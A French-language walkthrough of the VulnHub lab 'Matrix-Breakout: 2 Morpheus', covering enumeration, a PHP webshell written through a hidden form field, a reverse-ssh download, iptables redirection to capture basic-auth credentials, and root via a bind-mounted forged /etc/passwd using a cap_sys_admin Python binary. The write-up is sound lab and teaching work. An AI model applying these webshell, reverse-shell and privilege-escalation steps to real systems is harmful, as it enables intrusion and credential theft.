# Solution du CTF Matrix-Breakout: 2 Morpheus de VulnHub

[Matrix-Breakout: 2 Morpheus](https://vulnhub.com/entry/matrix-breakout-2-morpheus,757/) est le nom donné par [Jay Beale](https://twitter.com/@jaybeale) à un CTF posté sur VulnHub. La difficulté annoncée est moyenne / difficile.

```
Nmap scan report for 192.168.242.129
Host is up (0.00057s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|_  256 aa83c351786170e5b7469f07c4ba31e4 (ECDSA)
80/tcp open  http    Apache httpd 2.4.51 ((Debian))
|_http-title: Morpheus:1
|_http-server-header: Apache/2.4.51 (Debian)
81/tcp open  http    nginx 1.18.0
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Meeting Place
|_http-title: 401 Authorization Required
|_http-server-header: nginx/1.18.0
```

A première vue une énumération web avec *Feroxbuster* ne donne rien d'intéressant :

```
301        9l       28w      323c http://192.168.242.129/javascript
301        9l       28w      330c http://192.168.242.129/javascript/jquery
403        9l       28w      280c http://192.168.242.129/server-status
200    10870l    44283w   287600c http://192.168.242.129/javascript/jquery/jquery
```

Le serveur web semble avoir du répondant alors j'en profite pour tester des fichiers avec une bonne liste d'extensions :

```bash
feroxbuster -u http://192.168.242.129/ -w fuzzdb/discovery/predictable-filepaths/filename-dirname-bruteforce/raft-large-words.txt -x php,html,txt,zip,conf,sql,tar.gz,7z -n
```

Cette fois il en ressort deux entrées supplémentaires :

```
200       24l       56w      451c http://192.168.242.129/graffiti.php
200        4l       27w      139c http://192.168.242.129/graffiti.txt
```

On a déjà ce fichier texte :

> Mouse here - welcome to the Nebby!
> Make sure not to tell Morpheus about this graffiti wall.
> It's just here to let us blow off some steam.

Sur le script PHP on retrouve le même message avec un formulaire permettant de laisser un message. Si je rentre quelque chose, le texte apparait à la suite du précédent message et on le retrouve aussi dans le fichier `graffiti.txt`.

J'aurais parié que le script fait un `include()` du fichier texte. J'ai donc saisi `<?php system($_GET["cmd"]); ?>` mais le code n'était pas interprété et se retrouvait dans le code HTML de la page.

Par contre je me suis apperçu que le formulaire dispose d'un champ caché qui spécifie dans quel fichier écrire les données :

```html
<form method="post">
<label>Message</label><div><input type="text" name="message"></div>
<input type="hidden" name="file" value="graffiti.txt">
<div><button type="submit">Post</button></div>
</form>
```

Par conséquent on peut utiliser les outils de développement du navigateur pour modifier le nom du fichier et cette fois écrire notre shell dans un nouveau fichier PHP. J'obtiens alors mon webshell avec l'utilisateur `www-data`.

Le serveur autorise la connexion sortante sur le port 80, j'utilise mon webshell pour télécharger un reverse-ssh depuis un serveur web python que j'ai lancé :

```shellsession
$ sudo python3 -m http.server 80
[sudo] Mot de passe de root : 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.242.129 - - [20/Nov/2022 09:16:17] "GET /reverse-sshx64 HTTP/1.1" 200 -
```

A la racine du serveur web je trouve une image `.cypher-neo.png` mais elle ne recèle rien d'intéressant (analyse via `exiftool` et `ghex`).

Il y a deux utilisateurs présents sur le système. Aucun ne semble plus privilégié que l'autre :

```
uid=1000(trinity) gid=1000(trinity) groups=1000(trinity),1002(humans)
uid=1001(cypher) gid=1001(cypher) groups=1001(cypher),1002(humans)
```

La recherche des fichiers de `cypher` retourne un flag :

```shellsession
www-data@morpheus:/var/www$ find / -user cypher 2> /dev/null 
/home/cypher
/FLAG.txt
```

Voici le contenu :

> Flag 1!  
> 
> You've gotten onto the system.  Now why has Cypher locked everyone out of it?  
> 
> Can you find a way to get Cypher's password? It seems like he gave it to    
> Agent Smith, so Smith could figure out where to meet him.  
> 
> Also, pull this image from the webserver on port 80 to get a flag.  
> 
> /.cypher-neo.png

Le groupe `humans` a deux entrées :

```shellsession
www-data@morpheus:/var/www$ find / -group humans -ls 2> /dev/null 
       35   5352 -rwxr-x---   1 root     humans    5479736 Oct 28  2021 /usr/bin/python3-9
   134453      4 drwxrwxr-x   2 root     humans       4096 Oct 28  2021 /crew
```

Ne faisant pas, à ce stade de mes explorations, membre du groupe `humans` je ne peux pas lire le contenu de `/usr/bin/python3-9` mais la taille est exactement la même que `/usr/bin/python3.9` qui est le vrai interpréteur Python.

Le dossier `crew` est quand à lui vide...

J'ai cherché les noms de fichiers contenant `smith` ou `cypher` mais ça n'a rien retourné puis en regardant les ports en écoute je me suis rappelé de la présence du port 81 dont l'accès est protégé par une demande d'authentification.

On trouve la configuration du *Nginx* dans `/etc/nginx/sites-enabled/default` :

```nginx
server {
        listen 81 default_server;
        listen [::]:81 default_server;

        root /var/nginx/html;

        auth_basic "Meeting Place";
        auth_basic_user_file /var/nginx/html/.htpasswd;

        # Add index.php to the list if you are using PHP
        index index.html index.htm index.nginx-debian.html;

        server_name _;

        location / {
                # First attempt to serve request as file, then
                # as directory, then fall back to displaying a 404.
                try_files $uri $uri/ =404;
        }
}
```

J'ai accès au fichier `htpasswd` qui contient le hash au format Apache (une variante de MD5) :

`cypher:$apr1$e9o8Y7Om$5zgDW6WOO6Fl8rCC7jpvX0`

J'ai aussi les droits suffisants pour lire les fichiers servis par *Nginx* comme la page d'index :

```html
<html><head><title>Meeting Place</title></head><body>

                <p>
                <center>
                <h2>Dinner to Discuss Zion</h2>
                </center>
                </p>
                <p>
                Agent Smith, if you want to break into Zion, meet me in 3 days at the steak house at the corner of Wabash and Lake.
                <img src="ignorance-bliss.png">
                </p>
                <p>
                "I know this steak doesn't exist. I know that when I put it in my mouth, the Matrix is telling my brain that it is juicy and delicious. After nine years, you know what I realize? Ignorance is bliss."
                </p>
        </body>
</html>
```

L'image mentionnée dans le code HTML montre juste `Cypher` en train de manger son steak. L'image n'a pas de tags exif et ne semble pas contenir de chaines de caractères quelconques. J'ai balancé l'image sur quelques sites de stéganographie, voir si il y avait des données à récupérer via la méthode LSB mais ça n'a rien donné.

J'ai passé la wordlist *rockyou* sur le hash de `cypher` mais ç'a n'a rien donné :|

J'ai donc fouillé un peu avec *LinPEAS* et il a déjà remarqué que la copie du binaire Python a une capability :

```shellsession
www-data@morpheus:/tmp$ getcap /usr/bin/python3-9              
/usr/bin/python3-9 cap_sys_admin=ep
```

Je devrais pouvoir passer root avec ce binaire mais pour le moment je ne peux pas l'exécuter, il me faut au moins les permissions `humans`.

A court d'idées, j'ai vu un port en écoute sur l'interface loopback et il s'agit d'un HTTP :

```shellsession
www-data@morpheus:/tmp$ nc 127.0.0.1 46449 -v
Connection to 127.0.0.1 46449 port [tcp/*] succeeded!
GET / HTTP/1.0

HTTP/1.0 404 Not Found
Date: Sun, 20 Nov 2022 10:09:18 GMT
Content-Length: 19
Content-Type: text/plain; charset=utf-8
```

J'ai donc bruteforcé les URLs mais je ne suis parvenu à rien.

En général dans ces conditions j'ai recours à [pspy: Monitor linux processes without root permissions](https://github.com/DominicBreuker/pspy), un outil qui regarde en boucle la liste des process et permet de découvrir par exemple les taches exécutées depuis la crontab de root (que l'on ne peut pas lire directement en raison des permissions).

L'idée était la bonne :

```
2022/11/20 18:09:38 CMD: UID=0    PID=1      | /sbin/init 
2022/11/20 18:09:59 CMD: UID=0    PID=28034  | 
2022/11/20 18:09:59 CMD: UID=0    PID=28039  | sleep 60 
2022/11/20 18:10:01 CMD: UID=0    PID=28040  | /usr/sbin/CRON -f 
2022/11/20 18:10:59 CMD: UID=0    PID=28043  | /usr/bin/basic-auth-client 
2022/11/20 18:10:59 CMD: UID=0    PID=28048  | sleep 60 
2022/11/20 18:11:01 CMD: UID=0    PID=28049  | /usr/sbin/CRON -f 
2022/11/20 18:11:01 CMD: UID=0    PID=28050  | /bin/sh -c chown -R root /crew 
2022/11/20 18:11:59 CMD: UID=0    PID=28052  | /usr/bin/basic-auth-client 
2022/11/20 18:11:59 CMD: UID=0    PID=28057  | sleep 60 
2022/11/20 18:12:01 CMD: UID=0    PID=28058  | /usr/sbin/CRON -f 
```

Je trouve trace du `chown` dans un fichier de cron :

```shellsession
www-data@morpheus:/tmp$ cat /etc/cron.d/fix-ownership-on-crew
* * * * * root chown -R root /crew
```

Mais aucune trace de `basic-auth-client`. Il en va de même pour un fichier `/main.sh` vu dans la liste des processus mais absent sur le système. Tout ça est certainement du à l'utilisateur de containeurs Docker.

Ce programme `basic-auth-client` laisse penser qu'il se connecte sur le port 81 et qu'il simule en quelque sorte l'accès de l'`Agent Smith`. Je ne peux pas lire le binaire ni lire le flux réseau... comment faire alors pour obtenir les identifiants qui transitent ?

Je me suis rappelé dans l'output de *LinPEAS* que j'avais des entrées inhabituelles :

```
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
-rwsr-xr-x 1 root root 97K Jan 17  2021 /usr/sbin/xtables-legacy-multi (Unknown SUID binary)

--- snip ---

Files with capabilities (limited to 50):
/usr/bin/python3-9 cap_sys_admin=ep
/usr/bin/ping cap_net_raw=ep
/usr/sbin/xtables-legacy-multi cap_net_admin=ep
/usr/sbin/xtables-nft-multi cap_net_admin=ep
```

Les binaires `xtables` sont des sortes de wrapper autour des commandes *iptables*. Celui qui est setuid root semble refuser de fonctionner :

```shellsession
$ /usr/sbin/xtables-legacy-multi iptables -L
iptables v1.8.7 (legacy): can't initialize iptables table `filter': Permission denied (you must be root)
Perhaps iptables or your kernel needs to be upgraded.
```

L'autre qui a juste la capability `cap_net_admin` (voir [capabilities(7) - Linux manual page](https://man7.org/linux/man-pages/man7/capabilities.7.html)) fonctionne correctement :

```shellsession
$ /usr/sbin/xtables-nft-multi iptables -L
Chain INPUT (policy ACCEPT)
target     prot opt source               destination         

Chain FORWARD (policy DROP)
target     prot opt source               destination         
DOCKER-USER  all  --  anywhere             anywhere            
DOCKER-ISOLATION-STAGE-1  all  --  anywhere             anywhere            
ACCEPT     all  --  anywhere             anywhere             ctstate RELATED,ESTABLISHED
DOCKER     all  --  anywhere             anywhere            
ACCEPT     all  --  anywhere             anywhere            
ACCEPT     all  --  anywhere             anywhere            

Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination         

Chain DOCKER (1 references)
target     prot opt source               destination         

Chain DOCKER-ISOLATION-STAGE-1 (1 references)
target     prot opt source               destination         
DOCKER-ISOLATION-STAGE-2  all  --  anywhere             anywhere            
RETURN     all  --  anywhere             anywhere            

Chain DOCKER-ISOLATION-STAGE-2 (1 references)
target     prot opt source               destination         
DROP       all  --  anywhere             anywhere            
RETURN     all  --  anywhere             anywhere            

Chain DOCKER-USER (1 references)
target     prot opt source               destination         
RETURN     all  --  anywhere             anywhere
```

Mon objectif est donc d'utiliser `iptables` pour forwarder les paquets à destination du port 81 vers un port que j'aurais mis en écoute sur la machine (8181, qui ne nécessite pas de droits root).

J'ai fouillé un peu sur Internet et utilisé les commandes suivantes :

```shellsession
$ /usr/sbin/xtables-nft-multi iptables -A FORWARD -p tcp -d 172.17.0.1 --dport 81 -j ACCEPT
$ /usr/sbin/xtables-nft-multi iptables -A PREROUTING -t nat -i docker0 -p tcp --dport 81 -j DNAT --to 172.17.0.1:8181
```

Je ne suis pas sûr que la première commande soit nécessaire ici mais la seconde se charge de faire la redirection pour l'interface réseau du Docker. Dans le doute j'ai aussi appliqué la redirection pour chaque couple interface - adresse IP locale.

Finalement ça a frappé à la porte :

```shellsession
www-data@morpheus:/var/www/html$ nc -l -p 8181 -v
nc: getnameinfo: Temporary failure in name resolution
nc: getnameinfo: Temporary failure in name resolution
GET / HTTP/1.1
Host: 172.17.0.1:81
User-Agent: Go-http-client/1.1
Authorization: Basic Y3lwaGVyOmNhY2hlLXByb3N5LXByb2NlZWRzLWNsdWUtZXhwaWF0ZS1hbW1vLXB1Z2lsaXN0
Accept-Encoding: gzip
```

Le base64 de l'auth basic se décode en :

`cypher:cache-prosy-proceeds-clue-expiate-ammo-pugilist`

C'est clair que *rockyou* n'aurait pas cassé ça ! Le mot de passe permet de se connecter avec le compte `cypher` et du coup d'être enfin membre du groupe `humans` (youpi) !

Un flag est dans le dossier de l'utilisateur :

```shellsession
cypher@morpheus:~$ cat FLAG.txt 
You've clearly gained access as user Cypher.

Can you find a way to get to root?
```

Je pensais que la capability `cap_sys_admin` sur `/usr/bin/python3-9` me permettrait de faire un setuid 0 et d'obtenir un shell mais d'après la manpage, ce qui ressort c'est surtout la possibilité de pouvoir monter / démonter des systèmes de fichier.

J'ai trouvé ce post *StackOverflow* : [unix - How do I mount a filesystem using Python?](https://stackoverflow.com/questions/1667257/how-do-i-mount-a-filesystem-using-python/29156997#29156997) Il indique comment monter un FS en Python.

Mon idée était de créer un FS dans un fichier (`dd` pour créer un fichier vide de 10Mo, `mkfs.ext3` pour le formater) et de placer ensuite un shell setuid root dedans. Plus qu'à copier ensuite le fichier sur la VM et le monter pour obtenir le sésame, sauf que...

`OSError: [Errno 15] Error mounting file.fs (ext3) on /mnt with options 'rw': Block device required`

La fonction de la libc s'attend à recevoir un périphérique et non un fichier...

Du coup je me suis rabbatu sur l'astuce de [Linux Capabilities - HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_sys_admin) qui consiste à binder un fichier `passwd` par dessus le vrai `/etc/passwd` pour se connecter avec l'utilisateur `root` et un mot de passe de notre choix :

```shellsession
cypher@morpheus:~$ cp /etc/passwd .
cypher@morpheus:~$ openssl passwd -1 -salt abc devloop
$1$abc$I96LD.QLSgd3iCCrM7yNv1
cypher@morpheus:~$ vi passwd  # modifier l'entrée root pour remplacer 'x' par le hash
cypher@morpheus:~$ /usr/bin/python3-9
Python 3.9.2 (default, Feb 28 2021, 17:03:44) 
[GCC 10.2.1 20210110] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from ctypes import *
>>> libc = CDLL("libc.so.6")
>>> libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
>>> MS_BIND = 4096
>>> source = b"/home/cypher/passwd"
>>> target = b"/etc/passwd"
>>> filesystemtype = b"none"
>>> options = b"rw"
>>> mountflags = MS_BIND
>>> libc.mount(source, target, filesystemtype, mountflags, options)
0
>>> 
cypher@morpheus:~$ su root
Password: 
root@morpheus:/home/cypher# cd /root
root@morpheus:~# ls
FLAG.txt
root@morpheus:~# cat FLAG.txt 
You've won!

Let's hope Matrix: Resurrections rocks!
```

La requête d'authentification qu'on a redirigée était bien effectuée depuis un docker :

```shellsession
root@morpheus:~# docker ps
CONTAINER ID   IMAGE              COMMAND      CREATED         STATUS        PORTS     NAMES
c08573ce98d3   infinite-request   "/main.sh"   12 months ago   Up 23 hours             infinite-request
root@morpheus:~# docker exec -it c08573ce98d3 /bin/bash
root@c08573ce98d3:/# cat main.sh 
#!/bin/bash

while :
do
   /usr/bin/basic-auth-client
   sleep 60

done
```

On ne dispose pas du code source pour le binaire mais on sait ce qu'il fait :)

Un CTF très intéressant, merci à son auteur !

*Publié le 20 novembre 2022*
